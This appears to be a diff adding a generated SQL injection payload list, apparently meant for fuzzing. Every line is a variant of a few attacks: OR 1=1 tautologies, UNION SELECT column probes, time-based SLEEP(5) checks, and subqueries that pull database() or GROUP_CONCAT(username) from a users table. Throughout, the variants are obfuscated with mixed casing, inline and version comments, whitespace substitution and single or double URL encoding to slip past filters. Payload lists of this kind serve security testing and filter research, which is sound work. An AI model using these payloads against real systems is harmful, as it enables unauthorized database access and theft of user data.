@@ -1,0 +1,1537 @@
+' oR (sele#cT database()) --
+'%09OR%09'a'='a'%09--
+%27%2509Or%2509Ex/%2Arandom%2A/IstS%28SelE/%2A%2A/cT%2509%2A%2509frOm%2509users%29%2509--
+'%0aor%0a(S/*rANDom*/ElECt%0aGROUP_CONCAT(username)%0afRo--m%0ausers)%0a--
+' or IF(1=1,SLEEP(5),0) --
+' OR 'a'='a' --
+'	uNiOn	SeLec--t	1,2,3	--
+%27%0Aor%0AExI/%2Arandom%2A/STs%28sEL/%2A%2A/EcT%0A%2A%0AfRom%0Ausers%29%0A--
+%27%2509Or%2509%27a%27%3D%27a%27%2509--
+%27%250aoR%250aIF%281%3D1%2CSleEP%285%29%2C0%29%250a--
+%27%2509or%2509IF%281%3D1%2CSL--eEP%285%29%2C0%29%2509--
+%27%20OR%20%28selEcT%20GROUP_CONCAT%28username%29%20fr--om%20users%29%20--
+' or 'a'='a' --
+%27%250aor%250a1%3D1%250a--
+'	or	(SelECT	GROUP_CONCAT(username)	fR/*random*/Om	users)	--
+%27%0Aor%0A%28sElect%0ACOUNT%28%2A%29%0AfRom%0Ausers%29%3E0%0A--
+'
+oR
+(SElECT
+COUNT(*)
+fRom
+users)>0
+--
+%27%20or%20%27a%27%3D%27a%27%20--
+%27%2509oR%2509Exists%28seLE/%2A%2A/Ct%2509%2A%2509Fro%23m%2509users%29%2509--
+%27%250aOr%250a%28SEle/%2A%2150000%2A/ct%250aCOUNT%28%2A%29%250aF--rom%250ausers%29%3E0%250a--
+'
+OR
+1=1
+--
+%27%0Aor%0AeXisTs%28sELe/%2A%2A/CT%0A%2A%0Afr/%2A%2150000%2A/OM%0Ausers%29%0A--
+%27%20OR%20IF%281%3D1%2CsleEP%285%29%2C0%29%20--
+'%0aor%0a(select%0aGROUP_CONCAT(username)%0afr#om%0ausers)%0a--
+'
+Or
+'a'='a'
+--
+%27%2509or%2509%28sE--LECt%2509COUNT%28%2A%29%2509fro/%2Arandom%2A/M%2509users%29%3E0%2509--
+'	OR	(sELECt	COUNT(*)	f--ROm	users)>0	--
+%27%20Or%20IF%281%3D1%2CsLeEP%285%29%2C0%29%20--
+'
+OR
+1=1
+--
+%27%250aor%250a%28sElecT%250aGROUP_CONCAT%28username%29%250af/%2A%2A/rom%250ausers%29%250a--
+%27%250aOr%250a%28seLect%250aCOUNT%28%2A%29%250aFro--M%250ausers%29%3E0%250a--
+%27%20oR%20exisTs%28SeLec/%2A%2150000%2A/t%20%2A%20frO/%2A%2150000%2A/M%20users%29%20--
+'%09Or%09(SelEct%09COUNT(*)%09FrOM%09users)>0%09--
+%27%20or%20E--XIsts%28S/%2Arandom%2A/ElECt%20%2A%20from%20users%29%20--
+%27%250aoR%250aIF%281%3D1%2CSLEeP%285%29%2C0%29%250a--
+'
+UNIoN
+SelECT
+1,2,3
+--
+%27%250aor%250a1%3D1%250a--
+%27%250aOr%250a%28sElECT%250aGROUP_CONCAT%28username%29%250afROM%250ausers%29%250a--
+%27%09oR%09IF%281%3D1%2CslEEP%285%29%2C0%29%09--
+'
+UNIon
+SelEct
+1,2,3
+--
+%27%2509Or%25091%3D1%2509--
+%27%09Or%09%28SelECT%09COUNT%28%2A%29%09FroM%09users%29%3E0%09--
+'%0aor%0a(sELECT%0aGROUP_CONCAT(username)%0aFroM%0ausers)%0a--
+'
+or
+eX/**/isTS(SeLEct
+*
+F/**/Rom
+users)
+--
+%27%0AOR%0AIF%281%3D1%2CSLEE/%2A%2150000%2A/P%285%29%2C0%29%0A--
+%27%2509u/%2A%2150000%2A/NiON%2509SEleCT%25091%2C2%2C3%2509--
+'	uNION	SeleCT	1,2,3	--
+%27%2509or%2509%28selECT%2509database%28%29%29%2509--
+' OR (SELe/**/CT COUNT(*) FRo/*random*/M users)>0 --
+' UnI#On se/*rAN/*!50000*/dom*/lECt 1,2,3 --
+%27%0Aor%0AIF%281%3D1%2CS/%2Arandom%2A/leEP%285%29%2C0%29%0A--
+%27%0AoR%0A1%3D1%0A--
+'	Or	eXIsts(sel#EcT	*	Fr/**/Om	users)	--
+' or 'a'='a' --
+'%09or%09ExiSt/*random*/S(SeLect%09*%09FRoM%09users)%09--
+%27%250aor%250a1%3D1%250a--
+%27%20Or%20IF%281%3D1%2CS/%2A%2150000%2A/leEP%285%29%2C0%29%20--
+' or IF(1=1,sleeP(5),0) --
+' or (s/**/eLEcT GROUP_CONCAT(username) fRoM users) --
+' OR exISts(sELe--CT * fr--oM users) --
+'	or	1=1	--
+'	or	(SElECT	GROUP_CONCAT(username)	FROm	users)	--
+' Or (SeLE/**/Ct database()) --
+' un#IoN sel--ecT 1,2,3 --
+%27%20or%201%3D1%20--
+'
+oR
+(SelEcT
+database())
+--
+%27%09OR%09%28sE/%2AraNdom%2A/lect%09COUNT%28%2A%29%09fRom%09users%29%3E0%09--
+%27%2509oR%2509%28sel/%2A%2150000%2A/ecT%2509GROUP_CONCAT%28username%29%2509FrOm%2509users%29%2509--
+%27%09OR%09%28seLeCT%09database%28%29%29%09--
+'%09oR%091=1%09--
+%27%0AoR%0A1%3D1%0A--
+'%0auniON%0aSeLeCt%0a1,2,3%0a--
+'%09or%09'a'='a'%09--
+'%09oR%09'a'='a'%09--
+%27%0AOR%0A%28SelEc--t%0AGROUP_CONCAT%28username%29%0AFrOM%0Ausers%29%0A--
+' OR IF(1=1,s--LEep(5),0) --
+%27%20Or%20IF%281%3D1%2CsleeP%285%29%2C0%29%20--
+'
+Or
+eXISt--S(sELE/**/ct
+*
+frO/**/m
+users)
+--
+'%0aoR%0a(sEl/*!50000*/ECT%0adatabase())%0a--
+%27%250aUnI/%2A%2150000%2A/oN%250aSeLeCt%250a1%2C2%2C3%250a--
+'	oR	Ex/**/IstS(SeLEcT	*	fRoM	users)	--
+%27%2509or%2509%27a%27%3D%27a%27%2509--
+%27%0AOr%0A1%3D1%0A--
+'	OR	1=1	--
+'	OR	'a'='a'	--
+%27%20Or%20e--XisTs%28seLEC/%2Ara--ndom%2A/T%20%2A%20from%20users%29%20--
+%27%20oR%20EXIsTs%28SElEcT%20%2A%20froM%20users%29%20--
+%27%250aOr%250a%27a%27%3D%27a%27%250a--
+'%09UniON%09Select%091,2,3%09--
+' uNiON seLeCT 1,2,3 --
+' Or 'a'='a' --
+%27%0AOR%0A%28SeLECT%0ACOUNT%28%2A%29%0Af/%2A%2A/roM%0Ausers%29%3E0%0A--
+'	or	'a'='a'	--
+'%09uNIon%09SEleCt%091,2,3%09--
+'%0auN/*ran/**/dom*/iOn%0aseLect%0a1,2,3%0a--
+'%09uN--ioN%09s/**/eleCt%091,2,3%09--
+'%0aOR%0aExiS#ts(S/*rA/*random*/NDom*/eLEcT%0a*%0aF/*random*/ROM%0ausers)%0a--
+%27%0AoR%0A%27a%27%3D%27a%27%0A--
+' or IF(1=1,sLEeP(5),0) --
+'%0aOR%0aExiStS(SeLECT%0a*%0aFr/*random*/Om%0ausers)%0a--
+'%09union%09SEL/*rAnDom*/ecT%091,2,3%09--
+%27%09Or%09EXIStS%28SeLecT%09%2A%09frOM%09users%29%09--
+%27%09UNI--ON%09SELecT%091%2C2%2C3%09--
+'%0aUNioN%0asELeC#T%0a1,2,3%0a--
+%27%250aOr%250a%28SelECt%250aCOUNT%28%2A%29%250afRO/%2A%2A/M%250ausers%29%3E0%250a--
+%27%20UNIO--N%20SEleCt%201%2C2%2C3%20--
+'%09OR%09(select%09COUNT(*)%09Fr/*random*/Om%09users)>0%09--
+%27%250aoR%250a%27a%27%3D%27a%27%250a--
+%27%250aOR%250a%28SELeC/%2A%2A/t%250adatabase%28%29%29%250a--
+'	Or	e/**/XISts(SElE/*raN#dom*/ct	*	FRoM	users)	--
+' or (s/*!50000*/elecT database()) --
+'%0aunioN%0asElECT%0a1,2,3%0a--
+' OR IF(1=1,sLe--EP(5),0) --
+'%09Or%09IF(1=1,SlEEp(5),0)%09--
+'%09Or%09(SEL#ECt%09GROUP_CONCAT(username)%09fRoM%09users)%09--
+%27%09oR%09%28S--elEcT%09database%28%29%29%09--
+%27%20or%201%3D1%20--
+'
+oR
+exiS/*random*/ts(SeLeCT
+*
+fRO/**/M
+users)
+--
+'	Or	IF(1=1,s/**/Leep(5),0)	--
+'%0auNiOn%0aSeL/*!50000*/Ect%0a1,2,3%0a--
+%27%20or%201%3D1%20--
+'%09OR%09(se/*!50000*/lect%09GROUP_CONCAT(username)%09FROm%09users)%09--
+' OR (sElec--T database()) --
+%27%20OR%20%27a%27%3D%27a%27%20--
+%27%250aoR%250aexist%23S%28sELEC--t%250a%2A%250afROM%250ausers%29%250a--
+' UnioN sE/*ra--Ndom*/Lect 1,2,3 --
+%27%09Or%091%3D1%09--
+%27%0AoR%0A%28S/%2AraNDom%2A/ELECT%0AGROUP_CONCAT%28username%29%0AFR--OM%0Ausers%29%0A--
+%27%0AoR%0AIF%281%3D1%2CsLE/%2Arandom%2A/EP%285%29%2C0%29%0A--
+%27%250aoR%250a1%3D1%250a--
+'%0aOR%0aIF(1=1,sLEEp(5),0)%0a--
+%27%2509OR%25091%3D1%2509--
+'
+or
+'a'='a'
+--
+%27%250aor%250a%27a%27%3D%27a%27%250a--
+%27%250aOR%250aIF%281%3D1%2CslEeP%285%29%2C0%29%250a--
+' Or exiSts(SelECt * FroM users) --
+%27%2509or%2509%27a%27%3D%27a%27%2509--
+' UnIOn SelECT 1,2,3 --
+%27%20OR%201%3D1%20--
+%27%0AOR%0A%28SElEc/%2A%2A/t%0Adatabase%28%29%29%0A--
+'%0aoR%0a(sElEct%0aCOUNT(*)%0aFROM%0ausers)>0%0a--
+'	oR	(sE#lEct	GROUP_CONCAT(username)	from	users)	--
+%27%250aor%250aIF%281%3D1%2Cslee/%2Arandom%2A/P%285%29%2C0%29%250a--
+'%09or%09EXIsTS(SelEc#t%09*%09fRom%09users)%09--
+'%09OR%091=1%09--
+' or IF(1=1,slee--p(5),0) --
+'	UniON	seLecT	1,2,3	--
+' Or (seLeCT database()) --
+%27%0AOR%0A%28SElEcT%0ACOUNT%28%2A%29%0AFRoM%0Ausers%29%3E0%0A--
+%27%20OR%20IF%281%3D1%2CSLEep%285%29%2C0%29%20--
+'%09OR%09Ex#Ists(SEL--EcT%09*%09Fr--oM%09users)%09--
+' oR 1=1 --
+'%09u#niOn%09selECt%091,2,3%09--
+' OR (s#Elect COUNT(*) fR#OM users)>0 --
+'	or	e/*!50000*/XIsTS(seL/*random*/eCT	*	F--ROm	users)	--
+'
+oR
+1=1
+--
+%27%0AoR%0A%27a%27%3D%27a%27%0A--
+'
+oR
+'a'='a'
+--
+'%0aOR%0a1=1%0a--
+'%09oR%09(SE#LECT%09GROUP_CONCAT(username)%09frOM%09users)%09--
+'%09or%09eXi/**/stS(seLECt%09*%09f/**/roM%09users)%09--
+%27%09or%09%28SEle/%2A%2150000%2A/CT%09COUNT%28%2A%29%09froM%09users%29%3E0%09--
+'
+or
+(se--lEct
+database())
+--
+'
+or
+(SEle#Ct
+GROUP_CONCAT(username)
+FroM
+users)
+--
+%27%0Aor%0A%27a%27%3D%27a%27%0A--
+%27%09or%09%28SEL/%2ArAndom%2A/ecT%09database%28%29%29%09--
+'%0aOr%0a1=1%0a--
+%27%2509uNIOn%2509s--ELeCT%25091%2C2%2C3%2509--
+' or IF(1=1,sLeeP(5),0) --
+%27%20OR%20%28Sel%23EcT%20COUNT%28%2A%29%20FROm%20users%29%3E0%20--
+%27%0Aor%0AeXiSts%28selECT%0A%2A%0AF--ROM%0Ausers%29%0A--
+%27%250aOR%250a%28SelecT%250adatabase%28%29%29%250a--
+'%09oR%09'a'='a'%09--
+'
+Or
+'a'='a'
+--
+%27%2509unIOn%2509SeLeCt%25091%2C2%2C3%2509--
+'
+oR
+'a'='a'
+--
+' oR exISt/**/s(SelECt * F#rOM users) --
+%27%09OR%09%28SElEct%09database%28%29%29%09--
+%27%2509UNiOn%2509sEl/%2A%2150000%2A/ECT%25091%2C2%2C3%2509--
+'%0aOr%0aIF(1=1,SLeep(5),0)%0a--
+'
+or
+(sELECt
+COUNT(*)
+F/**/ROM
+users)>0
+--
+%27%2509OR%2509%27a%27%3D%27a%27%2509--
+'
+unIoN
+SEle--Ct
+1,2,3
+--
+%27%2509OR%2509%28SelecT%2509database%28%29%29%2509--
+%27%0AOR%0A%28seL/%2A%2150000%2A/eCt%0ACOUNT%28%2A%29%0Af%23rOM%0Ausers%29%3E0%0A--
+'	oR	'a'='a'	--
+'	oR	IF(1=1,SlEep(5),0)	--
+%27%250aor%250a1%3D1%250a--
+'	oR	eXists(SEl/*ran--dom*/ecT	*	fRo/*!50000*/M	users)	--
+'%0aOr%0a(sEle#Ct%0aCOUNT(*)%0afrOM%0ausers)>0%0a--
+'%09oR%091=1%09--
+' Or (SEl#eCt database()) --
+'	OR	(sElecT	COUNT(*)	froM	users)>0	--
+%27%09oR%09%28SELEct%09COUNT%28%2A%29%09fRO%23m%09users%29%3E0%09--
+'	OR	'a'='a'	--
+'%09Or%09EXisTs(S/*!50000*/eLect%09*%09fROm%09users)%09--
+' Or 1=1 --
+'
+OR
+(SelEc/**/T
+GROUP_CONCAT(username)
+fr/*!50000*/om
+users)
+--
+%27%2509oR%2509%28SEl/%2A%2A/eCt%2509database%28%29%29%2509--
+'
+OR
+IF(1=1,S/**/LeeP(5),0)
+--
+'	or	e/*random*/XiSTs(SELe/**/Ct	*	f/*random*/ROm	users)	--
+'
+OR
+1=1
+--
+' Or EXIst/*!50000*/S(S/*!50000*/eLECT * froM users) --
+'%0aoR%0a'a'='a'%0a--
+'	oR	(selECt	COUNT(*)	FROM	users)>0	--
+%27%0AOR%0A%28SeLec/%2ArANdom%2A/T%0ACOUNT%28%2A%29%0AfRom%0Ausers%29%3E0%0A--
+%27%09uniOn%09sEleCT%091%2C2%2C3%09--
+'	uNION	SElEct	1,2,3	--
+%27%20or%20%28SElECT%20COUNT%28%2A%29%20FrOM%20users%29%3E0%20--
+'%0aor%0a(seleCt%0adatabase())%0a--
+%27%2509OR%2509%27a%27%3D%27a%27%2509--
+' oR EXiSTs(S--ELeCT * FrOM users) --
+%27%20Or%20%28sELEcT%20GROUP_CONCAT%28username%29%20Fr/%2A%2A/om%20users%29%20--
+'
+Or
+exiS/**/ts(select
+*
+Fro/*random*/M
+users)
+--
+'	Or	(seLECT	COUNT(*)	Fr/*random*/Om	users)>0	--
+'%0auNi/**/oN%0aselEC/*ranDom*/T%0a1,2,3%0a--
+%27%2509Or%2509e/%2A%2A/XiSts%28sElecT%2509%2A%2509FrOM%2509users%29%2509--
+%27%20Or%20%28seleCT%20COUNT%28%2A%29%20frOM%20users%29%3E0%20--
+%27%250aor%250aeX/%2A%2150000%2A/IsTs%28seLeC%23t%250a%2A%250aF--RoM%250ausers%29%250a--
+'%0aOr%0a(sEleCT%0aGROUP_CONCAT(username)%0aFRo--M%0ausers)%0a--
+' OR 1=1 --
+'%09OR%09(SELect%09database())%09--
+%27%0AoR%0A%28se%23LECt%0Adatabase%28%29%29%0A--
+%27%20Or%201%3D1%20--
+%27%250aoR%250a1%3D1%250a--
+' u/**/NIOn sELECt 1,2,3 --
+%27%0Aor%0AExIst%23s%28sE/%2ArAndom%2A/Lect%0A%2A%0AfRO%23m%0Ausers%29%0A--
+'%0aOr%0a'a'='a'%0a--
+%27%2509Or%2509exiS%23tS%28selE--ct%2509%2A%2509fROM%2509users%29%2509--
+'
+oR
+'a'='a'
+--
+%27%20oR%20%28SeLeCt%20GROUP_CONCAT%28username%29%20FroM%20users%29%20--
+'
+OR
+(Sel#eCT
+GROUP_CONCAT(username)
+F/*random*/rOm
+users)
+--
+' uNI/*!50000*/oN SeLE/*rAN--dom*/cT 1,2,3 --
+%27%20oR%20%27a%27%3D%27a%27%20--
+'
+u/*ra#nDom*/NIOn
+SE/*ra#nDom*/LEcT
+1,2,3
+--
+'%0aoR%0a(SeLeCT%0aGROUP_CONCAT(username)%0af/**/rom%0ausers)%0a--
+'%09oR%091=1%09--
+%27%250aoR%250a%28sElE%23Ct%250aGROUP_CONCAT%28username%29%250aF/%2A%2150000%2A/rOM%250ausers%29%250a--
+'
+Un#IoN
+s/*ranDom*/ELECt
+1,2,3
+--
+%27%09UN/%2Arandom%2A/ION%09seLECt%091%2C2%2C3%09--
+'%09Or%09(SeleCt%09database())%09--
+%27%2509or%2509%28seLEcT%2509COUNT%28%2A%29%2509From%2509users%29%3E0%2509--
+'%0aOR%0a'a'='a'%0a--
+' Or IF(1=1,sLEep(5),0) --
+%27%0Aunio--N%0ASEl--eCT%0A1%2C2%2C3%0A--
+'	or	(sELect	database())	--
+'	or	'a'='a'	--
+%27%20oR%20eXISTS%28SeLEct%20%2A%20FR/%2A%2150000%2A/om%20users%29%20--
+'%09Unio#n%09sELeCt%091,2,3%09--
+%27%20UnIOn%20seLEct%201%2C2%2C3%20--
+' U--nIon seLEct 1,2,3 --
+'
+Or
+'a'='a'
+--
+%27%250aOR%250a%28s/%2Ara/%2Arandom%2A/Ndom%2A/ELEct%250adatabase%28%29%29%250a--
+%27%20Or%201%3D1%20--
+%27%09oR%09eXiSTs%28s/%2AraNdom%2A/eleCT%09%2A%09f/%2Arandom%2A/RoM%09users%29%09--
+'%0aOR%0a1=1%0a--
+'	or	(sel/**/ect	GROUP_CONCAT(username)	FRoM	users)	--
+'%09or%091=1%09--
+'	or	IF(1=1,SLe--ep(5),0)	--
+'%09u--NiON%09SELec/*!50000*/T%091,2,3%09--
+%27%0Aor%0Ae/%2A%2A/xists%28selEc/%2A%2A/t%0A%2A%0AfRom%0Ausers%29%0A--
+'%09oR%091=1%09--
+'	OR	(S--ELEcT	database())	--
+%27%0Aor%0A%28SELeCT%0AGROUP_CONCAT%28username%29%0AFRom%0Ausers%29%0A--
+'	Or	1=1	--
+' OR 'a'='a' --
+%27%2509oR%2509%27a%27%3D%27a%27%2509--
+'%0aor%0aIF(1=1,SLeEP(5),0)%0a--
+'
+Or
+(SELECT
+GROUP_CONCAT(username)
+fro/*random*/M
+users)
+--
+'
+uniON
+sELeCT
+1,2,3
+--
+' or 1=1 --
+'%0aOr%0a(seLEct%0adatabase())%0a--
+'	OR	eXIS/*random*/tS(SeLEC#T	*	fRO#M	users)	--
+'%0aOr%0ae--xists(seLeC/**/T%0a*%0afRom%0ausers)%0a--
+%27%0AoR%0A%28seL%23eCT%0ACOUNT%28%2A%29%0Af/%2A%2A/rOM%0Ausers%29%3E0%0A--
+%27%09oR%09%27a%27%3D%27a%27%09--
+%27%20oR%20%28SeLeCt%20GROUP_CONCAT%28username%29%20From%20users%29%20--
+'	Or	(SelE#cT	database())	--
+'	or	IF(1=1,SLeep(5),0)	--
+' OR (SelecT COUNT(*) frOM users)>0 --
+'%09or%09'a'='a'%09--
+%27%2509oR%2509%27a%27%3D%27a%27%2509--
+%27%0AOR%0A1%3D1%0A--
+'
+Or
+'a'='a'
+--
+%27%20Or%20%27a%27%3D%27a%27%20--
+%27%09OR%09%28SeLEct%09database%28%29%29%09--
+'
+oR
+(SElECT
+GROUP_CONCAT(username)
+Fr/*random*/om
+users)
+--
+%27%250aor%250aIF%281%3D1%2CSL/%2A%2150000%2A/Eep%285%29%2C0%29%250a--
+%27%250aOr%250a%28SElEcT%250adatabase%28%29%29%250a--
+%27%20OR%20%28se/%2A%2A/lECT%20COUNT%28%2A%29%20Fr%23om%20users%29%3E0%20--
+'%09OR%09(SELECt%09GROUP_CONCAT(username)%09frOM%09users)%09--
+'	Or	1=1	--
+%27%20Or%20%27a%27%3D%27a%27%20--
+'	OR	(sELect	COUNT(*)	fr/*!50000*/om	users)>0	--
+%27%20Or%20IF%281%3D1%2CsLE/%2Arandom%2A/Ep%285%29%2C0%29%20--
+%27%0Aor%0A%28sElECt%0Adatabase%28%29%29%0A--
+' Or IF(1=1,sLEeP(5),0) --
+%27%20OR%20%27a%27%3D%27a%27%20--
+%27%2509oR%2509IF%281%3D1%2CSLe/%2A%2150000%2A/eP%285%29%2C0%29%2509--
+%27%09or%09%27a%27%3D%27a%27%09--
+%27%09or%09%28SeLEct%09COUNT%28%2A%29%09From%09users%29%3E0%09--
+'%0aoR%0aIF(1=1,s--LeeP(5),0)%0a--
+'%0aUnIOn%0asELEct%0a1,2,3%0a--
+'%09Or%09exiStS(SElecT%09*%09Fro#M%09users)%09--
+'%0aor%0aExI/**/STs(sElEc/*!50000*/t%0a*%0aFr--OM%0ausers)%0a--
+%27%2509OR%2509%27a%27%3D%27a%27%2509--
+'	OR	ExISt--S(sE/*!50000*/LECT	*	fROM	users)	--
+'%09oR%09exist/**/S(SeleCT%09*%09FRoM%09users)%09--
+'%0aOR%0a'a'='a'%0a--
+'
+oR
+IF(1=1,slEE/*random*/P(5),0)
+--
+' Or 1=1 --
+'%09or%09e/**/xiSts(selEct%09*%09FRom%09users)%09--
+'
+oR
+IF(1=1,SLEep(5),0)
+--
+%27%2509or%25091%3D1%2509--
+%27%20or%20%28SeleC/%2AraN%23Dom%2A/t%20COUNT%28%2A%29%20fR/%2A%2150000%2A/OM%20users%29%3E0%20--
+%27%0AoR%0A%27a%27%3D%27a%27%0A--
+%27%2509uNion%2509SeLEcT%25091%2C2%2C3%2509--
+%27%2509uniOn%2509selEC/%2AranDom%2A/T%25091%2C2%2C3%2509--
+' oR (SELEct COUNT(*) fROM users)>0 --
+' or (SE/*rANDom*/lECT database()) --
+%27%250aor%250a%27a%27%3D%27a%27%250a--
+' OR (SeLeCT GROUP_CONCAT(username) FROm users) --
+%27%2509or%2509%28selECt%2509GROUP_CONCAT%28username%29%2509fROM%2509users%29%2509--
+'%09OR%09(sElect%09GROUP_CONCAT(username)%09fROM%09users)%09--
+' oR 'a'='a' --
+'%0aor%0a(sEleCT%0adatabase())%0a--
+'%0aoR%0a(Select%0aCOUNT(*)%0aFrOM%0ausers)>0%0a--
+' uNiON selECt 1,2,3 --
+'%0aoR%0aex--ISTs(sELE/*raNdom*/CT%0a*%0aFroM%0ausers)%0a--
+%27%2509OR%2509%27a%27%3D%27a%27%2509--
+' OR (selecT GROUP_CONCAT(username) fro/**/m users) --
+'%09Or%09eXIsTs(sEL/*!50000*/eCT%09*%09f/**/roM%09users)%09--
+'%09Uni/*random*/on%09sElect%091,2,3%09--
+%27%20or%20%28S%23EleCT%20database%28%29%29%20--
+'%0aunion%0aS#eLECT%0a1,2,3%0a--
+'
+u/**/NIoN
+selECT
+1,2,3
+--
+%27%20OR%201%3D1%20--
+'%0aor%0a1=1%0a--
+%27%250aOr%250aEX--IStS%28SELeCT%250a%2A%250aFro/%2A%2A/M%250ausers%29%250a--
+'
+or
+(SeLecT
+database())
+--
+%27%250aOR%250a%28SelecT%250aGROUP_CONCAT%28username%29%250afR%23om%250ausers%29%250a--
+%27%20UNIOn%20SElECt%201%2C2%2C3%20--
+%27%250aOr%250a%28sel/%2ArAn/%2Arandom%2A/Dom%2A/ECT%250adatabase%28%29%29%250a--
+%27%250aor%250aIF%281%3D1%2CS%23leEP%285%29%2C0%29%250a--
+%27%250aun/%2ArA/%2A%2A/Ndom%2A/ioN%250aSE/%2A%2150000%2A/LeCT%250a1%2C2%2C3%250a--
+%27%20OR%20IF%281%3D1%2CSle%23EP%285%29%2C0%29%20--
+'%0aOR%0a1=1%0a--
+'	unioN	S#ELECT	1,2,3	--
+'	Or	(SE#lECT	COUNT(*)	F#ROM	users)>0	--
+'
+OR
+(seLecT
+database())
+--
+%27%09OR%09eXisTS%28Se/%2ArAn--Dom%2A/lECt%09%2A%09fRO/%2A%2A/m%09users%29%09--
+' oR 'a'='a' --
+%27%250aor%250a%27a%27%3D%27a%27%250a--
+'%0aOr%0a(SElE#cT%0aCOUNT(*)%0aFr--om%0ausers)>0%0a--
+'
+or
+eX#iSTS(Sel#EcT
+*
+f/**/Rom
+users)
+--
+'
+OR
+EXIStS(SELec--t
+*
+frOM
+users)
+--
+%27%0AOR%0A%27a%27%3D%27a%27%0A--
+%27%0AoR%0A%28seLEct%0ACOUNT%28%2A%29%0Af/%2A%2150000%2A/ROm%0Ausers%29%3E0%0A--
+'%09Or%09(selE--ct%09GROUP_CONCAT(username)%09f/**/rOm%09users)%09--
+%27%0Aunion%0AsEleCT%0A1%2C2%2C3%0A--
+'	OR	(SeLEct	GROUP_CONCAT(username)	fr#OM	users)	--
+'	OR	IF(1=1,SlEeP(5),0)	--
+%27%250aOr%250aIF%281%3D1%2Csle/%2A%2150000%2A/Ep%285%29%2C0%29%250a--
+%27%09Or%091%3D1%09--
+%27%250aor%250a%27a%27%3D%27a%27%250a--
+' Or 'a'='a' --
+'
+oR
+(s#ElEct
+GROUP_CONCAT(username)
+frOm
+users)
+--
+'%0aOr%0a(SeL/*!50000*/Ect%0adatabase())%0a--
+'%0aUNio/*!50000*/N%0aSELECt%0a1,2,3%0a--
+'	Or	'a'='a'	--
+' or (SeL#eCT COUNT(*) FRoM users)>0 --
+%27%2509or%25091%3D1%2509--
+'	OR	(seLe--cT	database())	--
+'%09OR%09(s/*!50000*/elEct%09COUNT(*)%09frOM%09users)>0%09--
+%27%20or%20%28SeLeCt%20database%28%29%29%20--
+%27%20OR%20%28seleCt%20database%28%29%29%20--
+%27%2509OR%2509IF%281%3D1%2CSlEep%285%29%2C0%29%2509--
+'%0au/**/nIon%0asELect%0a1,2,3%0a--
+'
+Or
+(s/**/eleCT
+COUNT(*)
+FRom
+users)>0
+--
+%27%20or%20eXIStS%28SEleCt%20%2A%20fr/%2A%2A/OM%20users%29%20--
+'
+OR
+(selE/*raNDom*/Ct
+GROUP_CONCAT(username)
+FROM
+users)
+--
+%27%20or%20eXIS/%2A%2A/ts%28SElE--CT%20%2A%20frO/%2A%2150000%2A/M%20users%29%20--
+'
+oR
+IF(1=1,sLeE/*random*/p(5),0)
+--
+%27%0AOR%0A%28selEcT%0AGROUP_CONCAT%28username%29%0AFROM%0Ausers%29%0A--
+'
+or
+(SElEC#T
+GROUP_CONCAT(username)
+Fro/*random*/m
+users)
+--
+%27%20Or%20%28sELECt%20COUNT%28%2A%29%20f/%2Arandom%2A/RoM%20users%29%3E0%20--
+'
+oR
+(selECT
+GROUP_CONCAT(username)
+F#rOM
+users)
+--
+%27%0AOr%0A%28seLEcT%0AGROUP_CONCAT%28username%29%0AF/%2Arandom%2A/rom%0Ausers%29%0A--
+'	Or	1=1	--
+'	UnIOn	sE--leCT	1,2,3	--
+'%0aOR%0a(seL/*raNDom*/eCT%0aCOUNT(*)%0aFrOM%0ausers)>0%0a--
+%27%250aoR%250a%27a%27%3D%27a%27%250a--
+%27%0AOr%0A%28sELe/%2A%2A/CT%0Adatabase%28%29%29%0A--
+'%0aor%0aExIStS(selecT%0a*%0aFrOm%0ausers)%0a--
+' or IF(1=1,sLEEp(5),0) --
+%27%2509U%23NIOn%2509sEleCt%25091%2C2%2C3%2509--
+' Or 'a'='a' --
+%27%250aUNI/%2A%2A/on%250aseLeC/%2A%2150000%2A/T%250a1%2C2%2C3%250a--
+'%09Or%09(seLect%09GROUP_CONCAT(username)%09From%09users)%09--
+'	oR	IF(1=1,s--lEep(5),0)	--
+'%09OR%09(seLecT%09database())%09--
+%27%2509Or%2509%28SElECT%2509COUNT%28%2A%29%2509FRO/%2Arandom%2A/m%2509users%29%3E0%2509--
+%27%0AOr%0A%28Se/%2A%2A/LEcT%0Adatabase%28%29%29%0A--
+%27%2509or%2509IF%281%3D1%2CSleeP%285%29%2C0%29%2509--
+%27%20OR%20%28SElECT%20COUNT%28%2A%29%20fr/%2A%2150000%2A/om%20users%29%3E0%20--
+%27%0AoR%0A%28SeLe/%2A%2150000%2A/ct%0AGROUP_CONCAT%28username%29%0AfrOm%0Ausers%29%0A--
+'%09or%09(SeLECT%09GROUP_CONCAT(username)%09frOM%09users)%09--
+'%0aoR%0a1=1%0a--
+'
+OR
+'a'='a'
+--
+'
+oR
+1=1
+--
+'%09or%09(sELect%09GROUP_CONCAT(username)%09fRoM%09users)%09--
+'
+OR
+1=1
+--
+'%09or%09exiSts(SEl/*!50000*/eCT%09*%09Fro/**/m%09users)%09--
+'
+Or
+1=1
+--
+'
+or
+1=1
+--
+'%09or%09'a'='a'%09--
+%27%250aOR%250aexIs/%2A%2A/TS%28SeLECT%250a%2A%250aFRom%250ausers%29%250a--
+'
+oR
+(SELEcT
+database())
+--
+%27%0Aunion%0As--Elect%0A1%2C2%2C3%0A--
+'	or	IF(1=1,S#LEeP(5),0)	--
+%27%250aunIOn%250aselECt%250a1%2C2%2C3%250a--
+%27%20oR%201%3D1%20--
+'	OR	(S#ElEct	COUNT(*)	FROM	users)>0	--
+%27%250aOr%250aIF%281%3D1%2CSlEeP%285%29%2C0%29%250a--
+%27%2509oR%2509IF%281%3D1%2CSlEEp%285%29%2C0%29%2509--
+'%09oR%09(sELE/**/ct%09GROUP_CONCAT(username)%09fR#OM%09users)%09--
+'%09unION%09sELECt%091,2,3%09--
+'	uniOn	sel--ECt	1,2,3	--
+%27%2509or%2509IF%281%3D1%2CsleeP%285%29%2C0%29%2509--
+'
+Or
+(SELEct
+database())
+--
+' UNion seLeCt 1,2,3 --
+%27%250aunIOn%250asEleCT%250a1%2C2%2C3%250a--
+%27%2509Or%2509%28sELeCt%2509COUNT%28%2A%29%2509fROm%2509users%29%3E0%2509--
+'
+oR
+(se/*!50000*/lecT
+database())
+--
+'%0aun/*rAn/*!50000*/dom*/Ion%0aSeLecT%0a1,2,3%0a--
+'%09Or%09IF(1=1,S#LEep(5),0)%09--
+%27%2509U--NION%2509Se/%2Aran/%2Arandom%2A/dom%2A/LeCt%25091%2C2%2C3%2509--
+'%09Or%09IF(1=1,sLEEP(5),0)%09--
+'%09or%09(selEc--t%09GROUP_CONCAT(username)%09Fr/*!50000*/oM%09users)%09--
